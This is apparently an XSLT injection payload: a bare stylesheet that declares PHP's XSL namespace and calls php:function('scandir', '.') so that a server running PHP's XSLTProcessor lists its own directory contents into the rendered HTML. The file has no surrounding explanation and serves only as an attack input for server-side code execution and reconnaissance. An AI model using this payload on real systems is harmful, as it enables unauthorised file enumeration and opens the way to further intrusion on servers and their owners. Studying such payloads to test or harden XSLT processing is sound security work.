<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">

  <xsl:template match="/">
    <html>
      <body style="font-family:Arial;font-size:12pt;background-color:#EEEEEE">
        <xsl:variable name="listing" select="php:function('scandir', '.')" />
        <xsl:value-of select="$listing" />
      </body>
    </html>
  </xsl:template>
</xsl:stylesheet>

